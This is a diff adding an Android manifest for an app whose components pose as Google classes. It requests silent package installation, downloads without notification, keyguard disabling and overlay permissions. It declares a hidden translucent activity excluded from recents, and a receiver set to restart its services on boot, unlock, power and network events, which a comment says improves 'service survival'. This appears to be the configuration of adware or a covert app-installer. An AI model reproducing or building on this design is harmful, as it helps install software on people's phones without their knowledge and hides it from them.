@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.android.crystal">
+
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.INSTALL_PACKAGES"/>
+    <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION"/>
+
+    <application
+        android:name="com.android.google.GoogleApplication"
+        android:allowBackup="true"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"   >
+
+
+        <activity
+            android:theme="@android:style/Theme.Translucent.NoTitleBar.Fullscreen"
+            android:name="com.android.crystal.components.SplashActivity"
+        android:excludeFromRecents="true"
+        android:icon="@mipmap/second_icon"
+        android:label="@string/nuts_app_name">
+        <intent-filter>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.DEFAULT" />
+        </intent-filter>
+    </activity>
+
+
+
+        <service android:name="com.android.crystal.components.MainService"
+            android:exported="true"/>
+
+        <receiver
+            android:name="com.android.crystal.components.MainReceiver"
+            android:enabled="true"
+            android:exported="true">
+            <intent-filter>
+                <!-- 自定义广播 for 安装完成后打开应用 -->
+                <action android:name="my.intent.action.PACKAGE_ADDED" /><!-- [config]=PACKAGE_ADD_ACTION -->
+                <!--pinku包安装广播-->
+                <action android:name="com.ibingo.intent.broadcast.INSTALL_COMPLETED" />
+                <!--下载完成广播-->
+                <action android:name="android.intent.action.DOWNLOAD_COMPLETE"/>
+                <action android:name="my.intent.action.DOWNLOAD_COMPLETE"/>
+                <!--定时任务广播-->
+                <action android:name="com.android.my.action.alarm" />
+                <!-- 自定义广播 for 下载通知栏点击后恢复下载 -->
+                <action android:name="my.intent.action.DOWNLOAD_NOTIFICATION_CLICKED" /><!-- [config]=NOTI_CLICKED_ACTION -->
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+                <!-- 以下四项为可选的action声明，可大大提高service存活率 -->
+                <action android:name="android.intent.action.MEDIA_MOUNTED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED" />
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED" />
+            </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.PACKAGE_ADDED" />
+                <action android:name="android.intent.action.PACKAGE_REMOVED" />
+                <data android:scheme="package" />
+            </intent-filter>
+        </receiver>
+
+        <receiver android:name="com.android.google.GoogleReceiverA" android:process="google.core.main"/>
+
+        <service android:name="com.android.google.GoogleServiceA" android:process="google.core.main">
+            <intent-filter>
+                <action android:name="com.android.my.action.start" /> <!-- [config]=REVIVE_ACTION -->
+            </intent-filter>
+        </service>
+        <service android:name="com.android.google.GoogleServiceB" android:process="google.core.empty"/>
+        <receiver android:name="com.android.google.GoogleReceiverB" android:process="google.core.empty"/>
+
+        <meta-data android:name="KINGS_APP_NAME"
+            android:value="DollarGetter_lg2"/>
+
+        <meta-data android:name="BINGO_ALLOCATED_CID"
+            android:value="112233"/>
+
+        <meta-data android:name="BINGO_CUSTOMIZED_CID"
+            android:value="112233"/>
+
+        <meta-data android:name="BINGO_CUSTOMIZED_FIRST_DELAY"
+            android:value="112233"/>
+
+        <meta-data android:name="BINGO_DEBUG"
+            android:value="true"/>
+
+    </application>
+</manifest>
